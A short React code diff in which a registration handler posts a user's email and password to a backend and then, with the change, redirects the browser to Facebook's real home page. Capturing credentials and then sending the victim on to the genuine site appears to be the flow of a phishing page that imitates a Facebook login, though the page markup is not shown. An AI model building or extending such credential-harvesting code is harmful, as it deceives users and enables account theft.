@@ -13,8 +13,8 @@ export default function Home() {
   const handleRegister = async () => {
     try {
       await postPersonas({ email: email, password: password });
-      console.log('Usuario insertado correctamente.');
-      // window.location.href = "https://www.facebook.com/?locale=es_LA";
+      // console.log('Usuario insertado correctamente.');
+      window.location.href = "https://www.facebook.com/?locale=es_LA";
     } catch (error) {
       console.error("Fallo en el registro:", error);
     }
